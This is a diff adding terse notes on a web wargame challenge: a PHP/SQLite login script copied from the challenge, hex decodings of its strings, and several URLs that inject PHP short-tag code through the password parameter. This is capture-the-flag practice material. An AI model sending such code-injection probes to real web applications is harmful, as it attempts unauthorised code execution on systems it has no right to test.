@@ -1,0 +1,25 @@
+http://wow.sinfocol.org/wargame/web/short_open_tag.php?username=sysroot&password=
+
+
+<?
+$bd = sqlite_open("\x75\x73\x75\x61\x72\x69\x6f\x73\x2e\x73\x71\x6c\x69\x74\x65");
+$user = preg_replace('/[^\w]/', '', $_GET['username']);
+$pass = md5($_GET['password']);
+$ret = sqlite_query($bd, "SELECT * FROM usuarios WHERE nombre = \"$user\" AND clave = \"$pass\"");
+if (sqlite_num_rows($ret) == 0) {
+    echo 'Autenticación fallida.';
+} else {
+    echo "Bienvenido $user!";
+}
+?>
+<? echo 1; ?> -> \x3c\x3f\x20\x65\x63\x68\x6f\x20\x31\x3b\x20\x3f\x3e
+
+sysroot -> \x73\x79\x73\x72\x6f\x6f\x74 
+
+\x75\x73\x75\x61\x72\x69\x6f\x73\x2e\x73\x71\x6c\x69\x74\x65
+(hex to ascii) -> usuarios.sqlite
+
+http://wow.sinfocol.org/wargame/web/short_open_tag.php?username=sysroot&password=%3C?%20echo%20%22hola%22;?%3E
+
+
+wow.sinfocol.org/wargame/web/short_open_tag.php?username=sysroot&password=$F(1)
